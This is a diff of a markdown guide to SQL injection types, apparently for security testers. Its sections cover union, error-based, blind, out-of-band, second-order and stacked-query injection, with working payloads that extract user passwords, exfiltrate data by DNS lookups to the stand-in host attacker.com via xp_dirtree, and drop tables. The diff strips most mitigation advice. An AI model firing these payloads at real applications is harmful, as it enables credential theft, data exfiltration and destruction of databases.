@@ -3,208 +3,200 @@
 
 ## 1. In-Band SQL Injection
 
-Attack and data retrieval occur over the **same channel**. These are often easiest to exploit.
+**Definition**
+In-Band SQL Injection is the most common form of SQLi. The attacker uses the same communication channel to send the malicious payload and receive the results directly in the application’s normal response.
+
+**Mechanics**
+
+1. Attacker injects SQL code into a user input (URL, form field, header).
+2. Application concatenates this input into an SQL query and sends it to the database.
+3. Database executes the modified query and returns results in the web response.
+
+**Attack Flow**
+
+```
+Attacker → Web Application → Database
+               ↑             ↓
+            Results ←─────────
+```
 
 ### 1.1 Union-Based SQLi
 
-**⇢** Combines attacker-controlled SELECT queries with the application’s original query via the `UNION` operator.
-**Mechanism.** If the number and data types of columns in the injected `SELECT` match the original query, the database returns both result sets concatenated.
+**Definition**
+Combines attacker-controlled query results with the original query using the `UNION` operator.
 
-**Example Payload**
+**Example**
+Original query:
 
-1. Determine column count:
+```sql
+SELECT id, name, price FROM products WHERE id = 5;
+```
 
-   ```
-   ' ORDER BY 1--  
-   ' ORDER BY 2--  
-   …  
-   ' ORDER BY 5--  (error when 5 > columns)
-   ```
-2. Extract data:
+Injected payload:
 
-   ```sql
-   ' UNION SELECT NULL, username, password FROM users-- 
-   ```
+```sql
+?id=5 UNION SELECT NULL, username, password FROM users-- 
+```
 
-   If the original query was `SELECT id,name,price FROM products…`, the injected query returns `username,password` in place of `id,name`.
+If column counts and types match, the response shows product details plus user credentials.
 
 **Detection**
 
-* Test `UNION SELECT NULL,NULL,…` with increasing `NULL` placeholders until no “column count” error.
-* Observe application output for injected data.
-
-**➥**
-
-* Requires knowledge of column count and compatible data types.
-* Can be blocked by strict input validation and parameterized queries.
-
----
+* Test with `ORDER BY n` to find column count.
+* Inject `UNION SELECT NULL, NULL,…` and observe data appearing on page.
 
 ### 1.2 Error-Based SQLi
 
-**⇢** Forces the database to generate error messages that reveal data or schema details.
-**Mechanism.** Inject expressions that cause type conversion or syntax errors, embedding subqueries whose results appear in the error.
+**Definition**
+Forces the database to generate an error that leaks schema or data information.
 
-**Example Payload**
+**Example**
 
 ```sql
-' AND 1=CONVERT(int, (SELECT @@version))--  
+?id=5 AND 1=CONVERT(int, (SELECT @@version))-- 
 ```
 
-If the database returns a conversion error, the message includes the server version string.
+If errors are displayed, the message exposes the database version.
 
 **Detection**
 
-* Inject malformed expressions (e.g., `AND 1=CONVERT(int, 'a')`) and examine returned error details.
-* Enable verbose errors in a test environment.
-
-**➥**
-
-* Reliant on the application displaying raw database errors.
-* Suppress error messages or use generic error pages to mitigate.
+* Inject invalid type conversions or syntax errors (e.g., `AND 1=CONVERT(int, 'a')`).
+* Enable verbose errors in a controlled environment to confirm leakage.
 
 ---
 
 ## 2. Blind SQL Injection
 
-No data is directly returned. Attackers infer information by observing changes in application behavior.
+**Definition**
+Occurs when the application does not return query results or error details. Attackers infer data by observing application behavior or response times.
 
-### 2.1 Boolean-Based (Content-Based) Blind
+**Use Case**
+When detailed errors are suppressed and UNION injections are blocked.
 
-**⇢** Sends payloads that evaluate to TRUE or FALSE and infers data based on content differences in the HTTP response.
+### 2.1 Boolean-Based Blind SQLi
 
-**Mechanism.**
+**Mechanics**
+Inject conditional expressions that evaluate to TRUE or FALSE and compare differences in content or status codes.
+
+**Example**
 
 ```
-?id=1 AND 1=1--   → page normal (TRUE)  
-?id=1 AND 1=2--   → page differs or returns “no results” (FALSE)  
+?id=5 AND 1=1--   → Normal page (TRUE)  
+?id=5 AND 1=2--   → Different page or “No results” (FALSE)  
 ```
 
-**Example: Extracting one character at a time**
+To extract a character:
 
 ```sql
-?id=1 AND SUBSTRING((SELECT TOP 1 password FROM users),1,1)='a'--  
+?id=5 AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'-- 
 ```
 
-If the first character of the password is `a`, the page behaves like the TRUE case.
+If the page matches the TRUE case, the character is ‘a’.
 
 **Detection**
 
-* Compare response bodies or status codes between known-true and known-false conditions.
-* Use automated tools to iterate through ASCII values.
+* Automate alternating TRUE and FALSE payloads; compare responses.
+* Use scripts to iterate through character values and observe behavior.
 
-**➥**
+### 2.2 Time-Based Blind SQLi
 
-* Slower than in-band; values must be extracted character by character.
-* Prevent by enforcing parameterized queries and uniform error/content responses.
+**Mechanics**
+Delays the response when a condition is true using database sleep functions.
 
----
+**Examples**
 
-### 2.2 Time-Based Blind
+* MySQL:
 
-**⇢** Uses database delay functions (`SLEEP`, `WAITFOR`) to infer TRUE/FALSE from response time.
+  ```sql
+  ?id=5 OR IF((SELECT ASCII(SUBSTRING(password,1,1)) FROM users LIMIT 1)>77, SLEEP(5), 0)-- 
+  ```
+* MSSQL:
 
-**Mechanism.**
-
-```
-?id=1 OR IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>77, SLEEP(5), 0)--  
-```
-
-If the condition is true, the server delays 5 seconds; otherwise, responds immediately.
-
-**Example Payloads**
-
-* **MySQL:** `… OR IF(condition, SLEEP(5), 0)--`
-* **MSSQL:** `…; IF(condition) WAITFOR DELAY '0:0:5'--`
-* **PostgreSQL:** `…; SELECT CASE WHEN condition THEN pg_sleep(5) END--`
+  ```sql
+  ; IF ((SELECT TOP 1 password FROM users) LIKE 'a%') WAITFOR DELAY '00:00:05'-- 
+  ```
 
 **Detection**
 
-* Measure response times programmatically.
-* Automate bitwise extraction of sensitive values.
-
-**➥**
-
-* Reliable when errors are suppressed.
-* Mitigation: consistent response times, parameterized queries.
+* Measure response latency programmatically.
+* A consistent delay indicates a TRUE condition.
 
 ---
 
 ## 3. Out-of-Band (OOB) SQL Injection
 
-Used when in-band and blind techniques are ineffective. Relies on the database server’s network capabilities to send data to an attacker-controlled host.
+**Definition**
+Uses two different channels: one to send the payload (web request) and another to receive data (DNS or HTTP requests to an attacker-controlled server).
 
-**⇢** The injected SQL causes the database to make an HTTP or DNS request to an external server, carrying data in the request.
-
-**Example Payload (MSSQL)**
+**Mechanics & Example**
 
 ```sql
-'; EXEC master..xp_dirtree '\\attacker.com\share'--  
+?id=5; EXEC master..xp_dirtree '\\attacker.com\share'-- 
 ```
 
-When executed, the server attempts to enumerate the UNC path, causing a DNS lookup to `attacker.com`, revealing data in the hostname or path.
+The database performs a DNS lookup or UNC share request to `attacker.com`, exfiltrating data via the network.
 
 **Detection**
 
 * Monitor DNS or HTTP logs on your controlled endpoint.
-* Use unique subdomains for each query (e.g., `a1.attacker.com`, `a2.attacker.com`) to reconstruct data.
-
-**➥**
-
-* Requires outbound network connectivity from the database server.
-* Can be blocked by egress filtering and strict network controls.
+* Use unique subdomains for each query to reconstruct extracted data.
 
 ---
 
 ## 4. Second-Order SQL Injection
 
-**⇢** The attacker injects a malicious payload that is **stored** by the application (e.g., in a user profile) and **later** executed in another context.
-
-**Mechanism.**
-
-1. User registration form stores the payload in the database.
-2. At a later stage—such as an admin viewing reports—the stored payload is concatenated into a query and executed.
+**Definition**
+The malicious payload is stored by the application (e.g., in a profile, log or comment) and executed later in a different context.
 
 **Example Scenario**
 
-* **Step 1:** Insert `joe'); DROP TABLE orders;--` as a user’s display name.
-* **Step 2:** The application later runs:
+1. Attacker registers with name:
 
-  ```sql
-  SELECT * FROM users WHERE name = '[stored name]';
-  ```
+   ```sql
+   joe'); DROP TABLE orders;--  
+   ```
+2. Later, an administrative report runs:
 
-  Without sanitization, the stored payload executes, dropping the `orders` table.
+   ```sql
+   SELECT * FROM users WHERE name = '[stored name]';  
+   ```
+
+   The stored payload executes, dropping the `orders` table.
 
 **Detection**
 
-* Audit stored data for SQL meta-characters (`'`, `;`, `--`).
-* Review code paths that retrieve and re-execute stored values in SQL contexts.
-
-**➥**
-
-* Prevent by sanitizing inputs on both insertion and retrieval, and using parameterized queries throughout.
+* Audit stored fields for SQL metacharacters (`';--`).
+* Review all code paths where stored values are used in queries.
 
 ---
 
 ## 5. Stacked (Piggy-Backed) Queries
 
-**⇢** Executes multiple SQL statements in one request by separating them with `;`.
+**Definition**
+Executes multiple SQL statements in one request by separating them with semicolons.
 
-**Mechanism.**
+**Example**
 
 ```sql
-?id=1; DROP TABLE users;--  
+?id=5; DROP TABLE users;-- 
 ```
 
-If the database driver allows stacked queries, the first query retrieves data and the second executes destructive actions.
+If stacking is permitted by the database driver, the first statement runs the intended query, and the second executes the destructive command.
 
 **Detection**
 
-* Test with `; DROP TABLE test;--` in inputs.
-* Confirm whether the database driver supports multiple statements.
+* Test with payloads like `; DROP TABLE test;--`.
+* Confirm whether the database API allows multiple statements.
 
-**➥**
+---
 
-* Many modern database APIs disable stacked queries by default.
-* Always use prepared statements, which typically forbid stacking.
+# Summary
+
+| Type                      | Detection Method                                         |
+| ------------------------- | -------------------------------------------------------- |
+| Union-Based & Error-Based | UNION/ORDER BY tests; force errors                       |
+| Boolean-Based Blind       | TRUE/FALSE payloads; response comparison                 |
+| Time-Based Blind          | Measure response delays                                  |
+| Out-of-Band               | External DNS/HTTP callbacks to controlled host           |
+| Second-Order              | Audit stored inputs; code review of later query contexts |
+| Stacked Queries           | Semicolon tests; API configuration                       |
